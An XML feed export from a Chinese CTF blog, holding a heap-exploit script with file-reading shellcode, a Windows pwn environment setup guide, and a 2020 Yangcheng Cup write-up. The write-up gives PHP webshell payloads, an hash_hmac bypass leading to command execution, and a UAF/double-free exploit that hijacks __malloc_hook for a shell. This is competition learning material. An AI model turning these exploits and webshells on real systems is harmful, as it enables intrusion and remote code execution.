class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process("./foo",env = &#123;"LD_PRELOAD":"./libc.so"&#125;)</span></span><br><span class="line">p = remote(<span class="string">"39.105.35.195"</span>,<span class="string">"13452"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc.so"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Your choice: "</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,data)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Your choice: "</span>)</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line">p.recvuntil(<span class="string">"Content: "</span>)</span><br><span class="line">p.send(data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Your choice: "</span>)</span><br><span class="line">p.sendline(<span class="string">"3"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Your choice: "</span>)</span><br><span class="line">p.sendline(<span class="string">"4"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">guess</span><span class="params">(data)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Your choice: "</span>)</span><br><span class="line">p.sendline(<span class="string">"5"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Want the cookie? "</span>)</span><br><span class="line">p.send(data)</span><br><span class="line">p.sendline(<span class="string">"1"</span>*<span class="number">0x800</span>)</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Content: "</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)<span class="number">-0x3EBCD0</span></span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line">libc.address =libc_base</span><br><span class="line"><span class="comment">#try cookie</span></span><br><span class="line">cookie = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x100</span>):</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'\x00'</span>*<span class="number">0x28</span>+p64(i)[<span class="number">0</span>])</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">s = p.recvuntil(<span class="string">"6. exit"</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="string">'Content: '</span> <span class="keyword">in</span> s:</span><br><span class="line">cookie += i</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> hex(cookie)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">0x100</span>):</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'\x00'</span>*<span class="number">0x28</span>+p64(i*<span class="number">0x100</span>+cookie)[:<span class="number">2</span>])</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">s = p.recvuntil(<span class="string">"6. exit"</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="string">'Content: '</span> <span class="keyword">in</span> s:</span><br><span class="line">cookie += i*<span class="number">0x100</span></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> hex(cookie)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">0x100</span>):</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'\x00'</span>*<span class="number">0x28</span>+p64(i*<span class="number">0x10000</span>+cookie)[:<span class="number">3</span>])</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">s = p.recvuntil(<span class="string">"6. exit"</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="string">'Content: '</span> <span class="keyword">in</span> s:</span><br><span class="line">cookie += i*<span class="number">0x10000</span></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> hex(cookie)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">0x100</span>):</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'\x00'</span>*<span class="number">0x28</span>+p64(i*<span class="number">0x1000000</span>+cookie)[:<span class="number">4</span>])</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">s = p.recvuntil(<span class="string">"6. exit"</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="string">'Content: '</span> <span class="keyword">in</span> s:</span><br><span class="line">cookie += i*<span class="number">0x1000000</span></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> hex(cookie)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">add(i)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">free(<span class="number">6</span>-i)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">p.sendline(<span class="string">"1"</span>*<span class="number">0x800</span>)</span><br><span class="line">guess(<span class="string">'\x00'</span>*<span class="number">0x28</span>+p32(cookie))</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">9</span>):</span><br><span class="line">add(i)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Content: "</span>)</span><br><span class="line">heap = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)</span><br><span class="line"><span class="keyword">print</span> hex(heap)</span><br><span class="line"></span><br><span class="line"><span class="comment">#overwrite</span></span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">guess(<span class="string">'\x00'</span>*<span class="number">0x28</span>+p32(cookie))</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#leak pie stack</span></span><br><span class="line">edit(<span class="number">0</span>,p64(libc.sym[<span class="string">'__free_hook'</span>]))</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(libc.sym[<span class="string">'printf'</span>]))<span class="comment">#0x3EFD0</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">'%p%14$p'</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">"0x"</span>)</span><br><span class="line">pie = int(p.recv(<span class="number">12</span>),<span class="number">16</span>)<span class="number">-0xFCF</span></span><br><span class="line">p.recvuntil(<span class="string">"0x"</span>)</span><br><span class="line">stack = int(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> hex(stack)</span><br><span class="line"><span class="keyword">print</span> hex(pie)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>))</span><br><span class="line">guess(<span class="string">'\x00'</span>*<span class="number">0x28</span>+p32(cookie))</span><br><span class="line">guess(p64(<span class="number">0</span>)*<span class="number">7</span>+p64(<span class="number">0x41</span>)+p64((heap&amp;<span class="number">0xffffffffff000</span>)))</span><br><span class="line">add(<span class="number">7</span>)</span><br><span class="line">add(<span class="number">7</span>)</span><br><span class="line">add(<span class="number">7</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(libc.sym[<span class="string">'mprotect'</span>]))</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(heap+<span class="number">0x180</span>))</span><br><span class="line"><span class="comment">#gdb.attach(p,'b free')</span></span><br><span class="line">shellcode = <span class="string">'''</span></span><br><span class="line"><span class="string">mov rax,2</span></span><br><span class="line"><span class="string">mov rdi,'''</span>+str(heap+<span class="number">0x180</span>+<span class="number">0x100</span>)+<span class="string">'''</span></span><br><span class="line"><span class="string">mov rsi,0</span></span><br><span class="line"><span class="string">mov rdx,0</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rax,0</span></span><br><span class="line"><span class="string">mov rsi,'''</span>+str(heap+<span class="number">0x180</span>+<span class="number">0x200</span>)+<span class="string">'''</span></span><br><span class="line"><span class="string">mov rdi,3</span></span><br><span class="line"><span class="string">mov rdx,0x100</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rax,1</span></span><br><span class="line"><span class="string">mov rsi,'''</span>+str(heap+<span class="number">0x180</span>+<span class="number">0x200</span>)+<span class="string">'''</span></span><br><span class="line"><span class="string">mov rdi,1</span></span><br><span class="line"><span class="string">mov rdx,0x100</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">shellcode = asm(shellcode,arch=<span class="string">'amd64'</span>)</span><br><span class="line">guess(shellcode.ljust(<span class="number">0x100</span>,<span class="string">'\x00'</span>)+<span class="string">'flag\x00'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;PWN&quot;&gt;&lt;a href=&quot;#PWN&quot; class=&quot;headerlink&quot; title=&quot;PWN&quot;&gt;&lt;/a&gt;PWN&lt;/h2&gt;&lt;h3 id=&quot;logger&quot;&gt;&lt;a href=&quot;#logger&quot; class=&quot;headerlink&quot; title=&quot;logger&quot;&gt;&lt;
      
    
    </summary>
    
    
      <category term="WP" scheme="https://nuoye-blog.github.io/categories/WP/"/>
    
    
      <category term="ctf" scheme="https://nuoye-blog.github.io/tags/ctf/"/>
    
      <category term="WP" scheme="https://nuoye-blog.github.io/tags/WP/"/>
    
      <category term="PWN" scheme="https://nuoye-blog.github.io/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>windows pwn环境搭建</title>
    <link href="https://nuoye-blog.github.io/2020/09/12/2f169ae1/"/>
    <id>https://nuoye-blog.github.io/2020/09/12/2f169ae1/</id>
    <published>2020-09-12T04:00:00.000Z</published>
    <updated>2020-09-12T11:52:46.909Z</updated>
    
    <content type="html"><![CDATA[<h1 id="windows-pwn环境搭建"><a href="#windows-pwn环境搭建" class="headerlink" title="windows pwn环境搭建"></a>windows pwn环境搭建</h1><h2 id="下载镜像并搭建虚拟机"><a href="#下载镜像并搭建虚拟机" class="headerlink" title="下载镜像并搭建虚拟机"></a>下载镜像并搭建虚拟机</h2><p><a href="https://msdn.itellyou.cn/" target="_blank" rel="noopener">网站</a></p><p>这里下载<code>win7 professional with sp1</code>版本（即<code>cn_windows_7_professional_with_sp1_vl_build_x64_dvd_u_677816.iso</code>镜像）。</p><p>接着新建虚拟机即可。</p><h2 id="安装python"><a href="#安装python" class="headerlink" title="安装python"></a>安装python</h2><p>选择版本2.7</p><p>下载地址：<a href="https://www.python.org/downloads/release/python-2718/" target="_blank" rel="noopener">https://www.python.org/downloads/release/python-2718/</a></p><h2 id="安装windbg"><a href="#安装windbg" class="headerlink" title="安装windbg"></a>安装windbg</h2><p>下载地址：<a href="https://www.microsoft.com/en-us/download/details.aspx?id=8279" target="_blank" rel="noopener">https://www.microsoft.com/en-us/download/details.aspx?id=8279</a></p><h2 id="安装wincheck"><a href="#安装wincheck" class="headerlink" title="安装wincheck"></a>安装wincheck</h2><p>首先下载安装<code>cmake</code>：<a href="https://cmake.org/download/" target="_blank" rel="noopener">https://cmake.org/download/</a></p><p>安装<code>vcpkg</code>，项目地址：<a href="https://github.com/microsoft/vcpkg" target="_blank" rel="noopener">https://github.com/microsoft/vcpkg</a></p><p>PS：已经安装好了VS，没有这个环节的话不太清楚</p><p>运行命令即可安装完成：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> VCPKG_DEFAULT_TRIPLET=x64-windows</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/microsoft/vcpkg</span><br><span class="line">.\vcpkg\bootstrap-vcpkg.bat</span><br><span class="line">vcpkg integrate install</span><br></pre></td></tr></table></figure><p>接着下载wincheck，项目地址：<a href="https://github.com/trailofbits/winchecksec" target="_blank" rel="noopener">https://github.com/trailofbits/winchecksec</a></p><p>修改其中的<code>CMakeLists.txt</code>，在<code>find_package</code>前添加下面两句命令（之前一直找不到包，卡了好久）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set(pe-parse_DIR %vcpkg&#x2F;buildtrees&#x2F;pe-parse&#x2F;x64-windows-rel&#x2F;pe-parser-library)</span><br><span class="line">set(uthenticode_DIR %vcpkg&#x2F;buildtrees&#x2F;uthenticode&#x2F;x64-windows-rel&#x2F;src)</span><br></pre></td></tr></table></figure><p>其中<code>%vcpkg</code>为<code>vcpkg</code>的地址。</p><p>然后跟着命令走：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt; vcpkg install pe-parse uthenticode</span><br><span class="line">&gt; git <span class="built_in">clone</span> https://github.com/trailofbits/winchecksec.git</span><br><span class="line">&gt; <span class="built_in">cd</span> winchecksec</span><br><span class="line">&gt; mkdir build</span><br><span class="line">&gt; <span class="built_in">cd</span> build</span><br><span class="line">&gt; cmake ..</span><br><span class="line">&gt; cmake --build . --config Release</span><br><span class="line">&gt; .\Release\winchecksec.exe C:\Windows\notepad.exe</span><br></pre></td></tr></table></figure><p>这样基本就完成winpwn的环境搭建。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;windows-pwn环境搭建&quot;&gt;&lt;a href=&quot;#windows-pwn环境搭建&quot; class=&quot;headerlink&quot; title=&quot;windows pwn环境搭建&quot;&gt;&lt;/a&gt;windows pwn环境搭建&lt;/h1&gt;&lt;h2 id=&quot;下载镜像并搭建虚拟机&quot;&gt;&lt;
      
    
    </summary>
    
    
      <category term="windows" scheme="https://nuoye-blog.github.io/categories/windows/"/>
    
    
      <category term="pwn" scheme="https://nuoye-blog.github.io/tags/pwn/"/>
    
      <category term="vmware" scheme="https://nuoye-blog.github.io/tags/vmware/"/>
    
      <category term="windows" scheme="https://nuoye-blog.github.io/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>2020羊城杯-WP</title>
    <link href="https://nuoye-blog.github.io/2020/09/12/d71d6ff7/"/>
    <id>https://nuoye-blog.github.io/2020/09/12/d71d6ff7/</id>
    <published>2020-09-12T04:00:00.000Z</published>
    <updated>2020-09-12T11:52:46.912Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这是不当人的一场比赛。。恰逢考试，还要一个人兼pwn和web，难受。。。。还好web不算太难，pwn的解题率就不尽人意了。。</p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="easycon"><a href="#easycon" class="headerlink" title="easycon"></a>easycon</h3><p><a href="http://183.129.189.60:10035/index.php，提示eval" target="_blank" rel="noopener">http://183.129.189.60:10035/index.php，提示eval</a> cmd，直接用蚁剑连接，密码cmd。在网站目录下找到bbbbbbbbb.txt文件，用base64解码得到包含flag的图片。</p><h3 id="BlackCat"><a href="#BlackCat" class="headerlink" title="BlackCat"></a>BlackCat</h3><p>在Hei_Mao_Jing_Chang.mp3中找到php的代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($_POST[<span class="string">'Black-Cat-Sheriff'</span>]) || <span class="keyword">empty</span>($_POST[<span class="string">'One-ear'</span>]))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'谁！竟敢踩我一只耳的尾巴！'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$clandestine = getenv(<span class="string">"clandestine"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'White-cat-monitor'</span>]))</span><br><span class="line">    $clandestine = hash_hmac(<span class="string">'sha256'</span>, $_POST[<span class="string">'White-cat-monitor'</span>], $clandestine);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$hh = hash_hmac(<span class="string">'sha256'</span>, $_POST[<span class="string">'One-ear'</span>], $clandestine);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($hh !== $_POST[<span class="string">'Black-Cat-Sheriff'</span>])&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'有意瞄准，无意击发，你的梦想就是你要瞄准的目标。相信自己，你就是那颗射中靶心的子弹。'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> exec(<span class="string">"nc"</span>.$_POST[<span class="string">'One-ear'</span>]);</span><br></pre></td></tr></table></figure><p>通过将White-cat-monitor设置为数组类型，使hash_hmac函数报错返回0，从而得到key，接着利用key进行sha256加密并且任意命令执行，在网站目录下flag.php中包含有flag。</p><p>POST数据：</p><p><img src= data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs= data-src="https://cdn.jsdelivr.net/gh/nuoye-blog/pic/img/20200911194044.png" alt="image-20200911193936098"></p><h3 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h3><p>php代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $files = scandir(<span class="string">'./'</span>); </span><br><span class="line">    <span class="keyword">foreach</span>($files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">        <span class="keyword">if</span>(is_file($file))&#123;</span><br><span class="line">            <span class="keyword">if</span> ($file !== <span class="string">"index.php"</span>) &#123;</span><br><span class="line">                unlink($file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'content'</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">'filename'</span>])) &#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $content = $_GET[<span class="string">'content'</span>];</span><br><span class="line">    <span class="keyword">if</span>(stristr($content,<span class="string">'on'</span>) || stristr($content,<span class="string">'html'</span>) || stristr($content,<span class="string">'type'</span>) || stristr($content,<span class="string">'flag'</span>) || stristr($content,<span class="string">'upload'</span>) || stristr($content,<span class="string">'file'</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Hacker"</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $filename = $_GET[<span class="string">'filename'</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/[^a-z\.]/"</span>, $filename) == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Hacker"</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $files = scandir(<span class="string">'./'</span>); </span><br><span class="line">    <span class="keyword">foreach</span>($files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">        <span class="keyword">if</span>(is_file($file))&#123;</span><br><span class="line">            <span class="keyword">if</span> ($file !== <span class="string">"index.php"</span>) &#123;</span><br><span class="line">                unlink($file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    file_put_contents($filename, $content . <span class="string">"\nHello, world"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>直接向index.php写入一句话木马即可，GET数据：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename&#x3D;index.php&amp;content&#x3D;%3C?php%20@eval($_POST[%27attack%27])%20?%3E</span><br></pre></td></tr></table></figure><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="sign-in"><a href="#sign-in" class="headerlink" title="sign_in"></a>sign_in</h3><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>简单的UAF漏洞。首先通过unsortbin来leak出libc地址，接着利用double free来申请到<code>__malloc_hook</code>处改为onegadget即可getshell了。</p><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">libc = ELF(<span class="string">"sign_in"</span>).libc</span><br><span class="line">p = process(<span class="string">"sign_in"</span>)</span><br><span class="line">p = remote(<span class="string">"183.129.189.60"</span>,<span class="string">"10029"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,name,message)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"choice : "</span>)</span><br><span class="line">p.sendline(str(<span class="number">1</span>))</span><br><span class="line">p.recvuntil(<span class="string">"game's name: "</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(<span class="string">"name:"</span>)</span><br><span class="line">p.send(name)</span><br><span class="line">p.recvuntil(<span class="string">" message:"</span>)</span><br><span class="line">p.send(message)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"choice : "</span>)</span><br><span class="line">p.sendline(str(<span class="number">3</span>))</span><br><span class="line">p.recvuntil(<span class="string">"index:"</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"choice : "</span>)</span><br><span class="line">p.sendline(str(<span class="number">2</span>))</span><br><span class="line">one = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line">add(<span class="number">0xf8</span>,<span class="string">'aaa\n'</span>,<span class="string">'aaa\n'</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x28</span>,<span class="string">'aaa\n'</span>,<span class="string">'aaa\n'</span>)<span class="comment">#1</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0xf8</span>,<span class="string">'\n'</span>,<span class="string">'a\n'</span>)<span class="comment">#2</span></span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">"Game[2]'s name :"</span>)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)<span class="number">-0x3C4B0A</span></span><br><span class="line">print(hex(libc.address))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'aaa\n'</span>,<span class="string">'aaa\n'</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'aaa\n'</span>,<span class="string">'aaa\n'</span>)<span class="comment">#4</span></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x68</span>,p64(libc.sym[<span class="string">'__malloc_hook'</span>]<span class="number">-0x23</span>)+<span class="string">'\n'</span>,<span class="string">'aaa\n'</span>)<span class="comment">#6</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'aaa\n'</span>,<span class="string">'aaa\n'</span>)<span class="comment">#7</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'aaa\n'</span>,<span class="string">'aaa\n'</span>)<span class="comment">#8</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x00'</span>*<span class="number">0xb</span>+p64(libc.sym[<span class="string">'realloc'</span>]+<span class="number">6</span>)+p64(libc.address+one[<span class="number">1</span>])+<span class="string">'\n'</span>,<span class="string">'aaa\n'</span>)<span class="comment">#6</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,'b malloc')</span></span><br><span class="line">p.recvuntil(<span class="string">"choice : "</span>)</span><br><span class="line">p.sendline(str(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 